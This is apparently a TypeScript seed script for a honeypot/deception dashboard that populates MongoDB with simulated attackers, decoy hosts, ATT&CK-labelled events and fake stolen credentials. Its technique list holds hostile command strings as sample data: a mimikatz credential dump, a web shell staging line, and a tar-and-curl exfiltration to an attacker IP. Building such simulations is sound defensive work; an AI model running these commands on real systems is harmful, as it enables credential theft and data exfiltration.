import mongoose from 'mongoose';
import { v4 as uuidv4 } from 'uuid';
import {
  Attacker,
  AttackEvent,
  Credential,
  DecoyHost,
  LateralMovement,
  VMStatus
} from '../models';
import { logger } from './logger';

const MONGODB_URI = process.env.MONGODB_URI || 'mongodb://localhost:27017/maya_deception';

const minutesAgo = (minutes: number) => new Date(Date.now() - minutes * 60 * 1000);
const randomInt = (min: number, max: number) => Math.floor(Math.random() * (max - min + 1)) + min;

const attackers = [
  {
    attackerId: 'attacker-10-20-20-100',
    ipAddress: '10.20.20.100',
    campaign: 'Shadow Hydra',
    currentPrivilege: 'Admin',
    entryPoint: 'fake-web-01',
    riskLevel: 'Critical' as const,
    dwellTime: 145,
    threatConfidence: 95,
    tools: ['nmap', 'metasploit', 'mimikatz']
  },
  {
    attackerId: 'attacker-10-20-20-150',
    ipAddress: '10.20.20.150',
    campaign: 'Iron Veil',
    currentPrivilege: 'User',
    entryPoint: 'fake-ftp-01',
    riskLevel: 'High' as const,
    dwellTime: 38,
    threatConfidence: 72,
    tools: ['hydra', 'curl', 'ftp']
  },
  {
    attackerId: 'attacker-10-20-20-200',
    ipAddress: '10.20.20.200',
    campaign: 'Ghost Pulse',
    currentPrivilege: 'Root',
    entryPoint: 'fake-jump-01',
    riskLevel: 'Critical' as const,
    dwellTime: 210,
    threatConfidence: 88,
    tools: ['ssh', 'smbclient', 'rsync']
  }
];

const techniques = [
  {
    stage: 'INITIAL_ACCESS' as const,
    type: 'Initial Access' as const,
    tactic: 'initial-access',
    tacticId: 'TA0001',
    tacticName: 'Initial Access',
    technique: 'T1078',
    techniqueName: 'Valid Accounts',
    description: 'Valid account login accepted by decoy service',
    command: 'ssh admin@fake-web-01',
    severity: 'High' as const
  },
  {
    stage: 'LATERAL_MOVEMENT' as const,
    type: 'Lateral Movement' as const,
    tactic: 'lateral-movement',
    tacticId: 'TA0008',
    tacticName: 'Lateral Movement',
    technique: 'T1021',
    techniqueName: 'Remote Services',
    description: 'Remote service pivot between decoy hosts',
    command: 'ssh -J fake-web-01 fake-jump-01',
    severity: 'High' as const
  },
  {
    stage: 'CREDENTIAL_ACCESS' as const,
    type: 'Credential Theft' as const,
    tactic: 'credential-access',
    tacticId: 'TA0006',
    tacticName: 'Credential Access',
    technique: 'T1003',
    techniqueName: 'OS Credential Dumping',
    description: 'Credential dump attempted against decoy host',
    command: 'mimikatz sekurlsa::logonpasswords',
    severity: 'Critical' as const
  },
  {
    stage: 'OTHER' as const,
    type: 'Persistence' as const,
    tactic: 'persistence',
    tacticId: 'TA0003',
    tacticName: 'Persistence',
    technique: 'T1505',
    techniqueName: 'Server Software Component',
    description: 'Web shell component staged on fake web server',
    command: 'echo shell.php > /var/www/html/upload.php',
    severity: 'High' as const
  },
  {
    stage: 'EXFILTRATION' as const,
    type: 'Data Exfiltration' as const,
    tactic: 'exfiltration',
    tacticId: 'TA0010',
    tacticName: 'Exfiltration',
    technique: 'T1041',
    techniqueName: 'Exfiltration Over C2 Channel',
    description: 'Decoy archive exfiltration attempted over command channel',
    command: 'tar czf - /srv/share | curl -X POST http://10.20.20.100/upload --data-binary @-',
    severity: 'Critical' as const
  }
];

export async function seedDatabase(): Promise<void> {
  try {
    const existingAttackers = await Attacker.countDocuments();
    if (existingAttackers > 0) {
      logger.info('Seed data already present, skipping simulation seed');
      return;
    }

    await DecoyHost.insertMany([
      { hostId: 'decoy-gateway-vm', hostname: 'gateway-vm', ipAddress: '10.20.20.1', segment: 'DMZ', os: 'Linux', services: ['nat', 'iptables'], status: 'Active', deploymentType: 'VM', interactions: 12, attackerIds: [], mitreTechniques: ['T1078'] },
      { hostId: 'decoy-fake-jump-01', hostname: 'fake-jump-01', ipAddress: '10.20.20.10', segment: 'Jump', os: 'Linux', services: ['ssh'], status: 'Under Attack', deploymentType: 'VM', interactions: 31, attackerIds: ['attacker-10-20-20-100', 'attacker-10-20-20-200'], mitreTechniques: ['T1021', 'T1003'] },
      { hostId: 'decoy-fake-web-01', hostname: 'fake-web-01', ipAddress: '10.20.20.20', segment: 'DMZ', os: 'Linux', services: ['nginx', 'ssh'], status: 'Compromised', deploymentType: 'VM', interactions: 46, attackerIds: ['attacker-10-20-20-100'], mitreTechniques: ['T1078', 'T1505'] },
      { hostId: 'decoy-fake-web-02', hostname: 'fake-web-02', ipAddress: '10.20.20.21', segment: 'DMZ', os: 'Linux', services: ['nginx'], status: 'Active', deploymentType: 'VM', interactions: 18, attackerIds: [], mitreTechniques: ['T1505'] },
      { hostId: 'decoy-fake-ftp-01', hostname: 'fake-ftp-01', ipAddress: '10.20.20.30', segment: 'DMZ', os: 'Linux', services: ['ftp'], status: 'Under Attack', deploymentType: 'VM', interactions: 24, attackerIds: ['attacker-10-20-20-150'], mitreTechniques: ['T1078'] },
      { hostId: 'decoy-fake-rdp-01', hostname: 'fake-rdp-01', ipAddress: '10.20.20.40', segment: 'Internal', os: 'Windows', services: ['rdp'], status: 'Active', deploymentType: 'VM', interactions: 9, attackerIds: [], mitreTechniques: ['T1021'] },
      { hostId: 'decoy-fake-smb-01', hostname: 'fake-smb-01', ipAddress: '10.20.20.50', segment: 'Internal', os: 'Windows', services: ['smb'], status: 'Active', deploymentType: 'VM', interactions: 14, attackerIds: ['attacker-10-20-20-200'], mitreTechniques: ['T1021', 'T1041'] }
    ]);

    await Attacker.insertMany(attackers.map((attacker, index) => ({
      attackerId: attacker.attackerId,
      ipAddress: attacker.ipAddress,
      entryPoint: attacker.entryPoint,
      currentPrivilege: attacker.currentPrivilege,
      riskLevel: attacker.riskLevel,
      campaign: attacker.campaign,
      firstSeen: minutesAgo(attacker.dwellTime),
      lastSeen: minutesAgo(index * 8 + 4),
      dwellTime: attacker.dwellTime,
      status: 'Active',
      geolocation: { country: 'Unknown', city: 'Simulated Source', coordinates: [0, 0] },
      fingerprint: {
        userAgent: `MayaSim/${attacker.threatConfidence}`,
        os: index === 1 ? 'Windows' : 'Linux',
        tools: attacker.tools
      }
    })));

    const events = attackers.flatMap((attacker, attackerIndex) => {
      const eventCount = attackerIndex === 0 ? 8 : attackerIndex === 1 ? 5 : 6;
      return Array.from({ length: eventCount }, (_, eventIndex) => {
        const technique = techniques[eventIndex % techniques.length];
        const targetHost = ['fake-web-01', 'fake-jump-01', 'fake-db-01', 'fake-ftp-01', 'fake-smb-01'][eventIndex % 5];

        return {
          eventId: `evt-${uuidv4()}`,
          timestamp: minutesAgo(attacker.dwellTime - eventIndex * 12),
          attackerId: attacker.attackerId,
          stage: technique.stage,
          type: technique.type,
          description: `${technique.description}: ${attacker.campaign}`,
          sourceHost: eventIndex === 0 ? attacker.ipAddress : attacker.entryPoint,
          targetHost,
          command: technique.command,
          severity: eventIndex > 2 && attacker.riskLevel === 'Critical' ? 'Critical' : technique.severity,
          status: eventIndex === eventCount - 1 ? 'In Progress' : 'Detected',
          tactic: technique.tactic,
          tacticId: technique.tacticId,
          tacticName: technique.tacticName,
          technique: technique.technique,
          techniqueName: technique.techniqueName,
          techniqueDescription: technique.description,
          isSubtechnique: false,
          mitreConfidence: Math.min(attacker.threatConfidence / 100, 0.98),
          classificationMethod: 'manual',
          allMatchingTechniques: [technique.technique],
          commandPatternMatched: technique.command.split(' ')[0],
          navigatorScore: attacker.threatConfidence,
          metadata: {
            processName: technique.command.split(' ')[0],
            userContext: attacker.currentPrivilege.toLowerCase()
          }
        };
      });
    });
    await AttackEvent.insertMany(events);

    const credentials = [
      { username: 'svc_backup', password: 'Backup2026!', protocol: 'SSH', attackerId: attackers[0].attackerId, decoyHost: 'fake-web-01', riskScore: 93 },
      { username: 'ftp_deploy', password: 'DeployMe123', protocol: 'FTP', attackerId: attackers[1].attackerId, decoyHost: 'fake-ftp-01', riskScore: 77 },
      { username: 'corp\\filesvc', password: 'Spring2026#', protocol: 'SMB', attackerId: attackers[2].attackerId, decoyHost: 'fake-smb-01', riskScore: 88 },
      { username: 'administrator', password: 'P@ssw0rd!2026', protocol: 'RDP', attackerId: attackers[0].attackerId, decoyHost: 'fake-rdp-01', riskScore: 96 }
    ];
    await Credential.insertMany(credentials.map(credential => ({
      credentialId: `cred-${uuidv4()}`,
      username: credential.username,
      password: credential.password,
      source: credential.protocol,
      attackerId: credential.attackerId,
      decoyHost: credential.decoyHost,
      timestamp: minutesAgo(randomInt(10, 120)),
      usageCount: randomInt(0, 4),
      lastUsed: minutesAgo(randomInt(4, 40)),
      status: 'Stolen',
      riskScore: credential.riskScore
    })));

    await LateralMovement.insertMany([
      { movementId: `mov-${uuidv4()}`, attackerId: attackers[0].attackerId, timestamp: minutesAgo(110), sourceHost: 'fake-web-01', targetHost: 'fake-jump-01', technique: 'T1021', method: 'SSH', successful: true, credentialsUsed: 'svc_backup' },
      { movementId: `mov-${uuidv4()}`, attackerId: attackers[0].attackerId, timestamp: minutesAgo(92), sourceHost: 'fake-jump-01', targetHost: 'fake-db-01', technique: 'T1021', method: 'SSH', successful: true, credentialsUsed: 'administrator' },
      { movementId: `mov-${uuidv4()}`, attackerId: attackers[2].attackerId, timestamp: minutesAgo(64), sourceHost: 'fake-jump-01', targetHost: 'fake-smb-01', technique: 'T1021', method: 'SMB', successful: true, credentialsUsed: 'corp\\filesvc' }
    ]);

    const vmNames = ['gateway-vm', 'fake-jump-01', 'fake-web-01', 'fake-web-02', 'fake-ftp-01', 'fake-rdp-01', 'fake-smb-01'];
    await VMStatus.insertMany(vmNames.map((vmName, index) => ({
      vmName,
      hostname: vmName,
      status: 'running',
      ip: `10.20.20.${index === 0 ? 1 : index * 10}`,
      lastSeen: new Date(),
      crdtState: {
        attackers: index % 3,
        credentials: index % 2,
        sessions: randomInt(1, 5),
        hash: uuidv4().replace(/-/g, '').slice(0, 12)
      },
      dockerContainers: [{
        id: uuidv4().replace(/-/g, '').slice(0, 12),
        name: 'cowrie',
        image: 'cowrie/cowrie:latest',
        status: 'running',
        ports: ['22/tcp'],
        created: new Date().toISOString()
      }]
    })));

    logger.info('Seed data inserted successfully');
  } catch (error) {
    logger.error('Error seeding database:', error);
  }
}

if (require.main === module) {
  mongoose.connect(MONGODB_URI)
    .then(() => seedDatabase())
    .finally(() => mongoose.connection.close());
}
